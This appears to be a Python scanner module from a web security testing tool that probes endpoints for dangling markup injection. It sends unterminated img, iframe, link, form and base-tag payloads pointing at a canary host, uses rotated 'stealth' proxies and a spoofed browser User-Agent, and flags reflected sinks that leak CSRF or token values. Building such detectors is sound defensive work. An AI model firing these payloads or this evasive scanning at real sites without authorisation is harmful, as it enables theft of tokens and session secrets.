"""Dangling Markup Injection & No-JS Data Exfiltration Auditor.

Audits for dangling markup injection vectors that capture and exfiltrate
sensitive DOM contents (CSRF tokens, API keys, form values) even under strict
script-blocking Content Security Policies (CSP).
"""
import re
from typing import Any, Dict, Iterable, List, Optional
import httpx
from bs4 import BeautifulSoup
from sqlalchemy.orm import Session

from backend_api.config import settings
from backend_api.models.endpoint import Endpoint
from backend_api.models.param import Param
from backend_api.models.finding import Finding, FindingStatus, Severity
from backend_api.utils.logger import logger
from backend_api.utils.request_builder import RequestBuilder
from backend_api.utils.rate_limiter import rate_limited_call


class DanglingMarkupAuditor:
    """Detects unescaped dangling markup injection for non-execution data exfiltration."""

    CANARY_HOST = "xssboss.invalid"

    # Unterminated attribute injection probes
    PROBES = [
        # Unterminated image src
        (f"<img src='https://{CANARY_HOST}/leak?data=", "dangling_markup_img", Severity.MEDIUM),
        # Unterminated iframe src
        (f"<iframe src='https://{CANARY_HOST}/leak?data=", "dangling_markup_iframe", Severity.MEDIUM),
        # Unterminated stylesheet link
        (f"<link rel='stylesheet' href='https://{CANARY_HOST}/leak?data=", "dangling_markup_link", Severity.MEDIUM),
        # Unterminated form action
        (f"<form action='https://{CANARY_HOST}/leak'><button type='submit'>", "dangling_markup_form", Severity.LOW),
        # Base href hijacking
        (f"<base href='https://{CANARY_HOST}/'>", "base_tag_hijacking", Severity.HIGH)
    ]

    @staticmethod
    def audit_endpoints(db: Session, endpoints: Iterable[Endpoint], limit: int = 30) -> List[Finding]:
        """Audit candidate endpoints and parameters for dangling markup reflection."""
        findings: List[Finding] = []
        checked = 0

        for endpoint in endpoints:
            if checked >= limit:
                break
            if not endpoint or not endpoint.url_pattern.startswith(("http://", "https://")):
                continue

            checked += 1
            for param in endpoint.params:
                if param.location not in ("query", "body", "json"):
                    continue

                for payload, vuln_type, severity in DanglingMarkupAuditor.PROBES:
                    try:
                        hit = DanglingMarkupAuditor._test_payload(endpoint, param, payload, vuln_type)
                        if hit:
                            finding = DanglingMarkupAuditor._upsert_finding(
                                db=db,
                                endpoint=endpoint,
                                param=param,
                                payload=payload,
                                vuln_type=vuln_type,
                                severity=severity,
                                details=hit
                            )
                            if finding:
                                findings.append(finding)
                                break
                    except Exception as err:
                        logger.debug(f"Dangling markup probe failed on {param.name}: {err}")
                        continue

        if findings:
            db.commit()
            for f in findings:
                db.refresh(f)
        return findings

    @staticmethod
    def _test_payload(
        endpoint: Endpoint,
        param: Param,
        payload: str,
        vuln_type: Optional[str] = None,
    ) -> Optional[Dict[str, Any]]:
        """Require a parsed exfiltration element, not mere source reflection."""
        target_url = RequestBuilder.url_with_query_param(endpoint.url_pattern, param.name, payload)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }

        from backend_api.utils.stealth import get_http_proxy_kwargs
        proxy_kwargs = get_http_proxy_kwargs(rotated=True)

        try:
            with httpx.Client(
                timeout=4.0,
                follow_redirects=True,
                verify=not settings.ALLOW_INSECURE_TLS,
                **proxy_kwargs,
            ) as client:
                resp = rate_limited_call(
                    target_url,
                    lambda: client.get(target_url, headers=headers),
                )
                body = resp.text

                content_type = (resp.headers.get("content-type") or "").lower()
                if payload not in body or (content_type and "html" not in content_type):
                    return None

                # Python's stdlib HTML parser follows the same critical rule as
                # browsers here: an unterminated quoted tag is discarded rather
                # than becoming a live <img>/<iframe>. Inspect the parsed tree
                # and require a real URL-bearing sink controlled by our canary.
                soup = BeautifulSoup(body, "html.parser")
                sink_specs = {
                    "dangling_markup_img": ("img", "src"),
                    "dangling_markup_iframe": ("iframe", "src"),
                    "dangling_markup_link": ("link", "href"),
                    "dangling_markup_form": ("form", "action"),
                    "base_tag_hijacking": ("base", "href"),
                }
                tag_name, attr_name = sink_specs.get(vuln_type or "", (None, None))
                if not tag_name:
                    return None

                sink = next(
                    (
                        node for node in soup.find_all(tag_name)
                        if DanglingMarkupAuditor.CANARY_HOST in str(node.get(attr_name) or "")
                    ),
                    None,
                )
                if sink is None:
                    return None

                sink_value = str(sink.get(attr_name) or "")
                has_sensitive_data = bool(
                    re.search(r'(?:csrf|token|nonce|auth|secret|password)', sink_value, re.IGNORECASE)
                )
                if vuln_type in {
                    "dangling_markup_img",
                    "dangling_markup_iframe",
                    "dangling_markup_link",
                } and not has_sensitive_data:
                    return None

                return {
                    "type": "dangling_markup",
                    "reflected_tag": payload,
                    "dom_sink_created": True,
                    "sink": f"{tag_name}.{attr_name}",
                    "sink_value": sink_value[:200],
                    "sensitive_token_exposed": has_sensitive_data,
                    "status_code": resp.status_code,
                }
        except Exception:
            pass

        return None

    @staticmethod
    def _upsert_finding(
        db: Session,
        endpoint: Endpoint,
        param: Param,
        payload: str,
        vuln_type: str,
        severity: Severity,
        details: Dict[str, Any]
    ) -> Optional[Finding]:
        try:
            evidence_summary = f"Dangling Markup Injection candidate ({vuln_type}) detected via parameter '{param.name}'. Details: {details}"
            finding = Finding(
                endpoint_id=endpoint.id,
                param_id=param.id,
                context_id=None,
                sink_id=None,
                vuln_type=vuln_type,
                scanner_module="dangling_markup_auditor",
                confidence="tentative",
                severity=severity,
                # HTTP parsing proves controllable markup, but runtime/OOB
                # evidence is still required before this can be confirmed.
                status=FindingStatus.DRAFT,
                best_payload=payload,
                evidence_summary=evidence_summary,
                report_text=evidence_summary,
            )
            db.add(finding)
            return finding
        except Exception as e:
            logger.debug(f"Failed to upsert Dangling Markup finding: {e}")
            return None
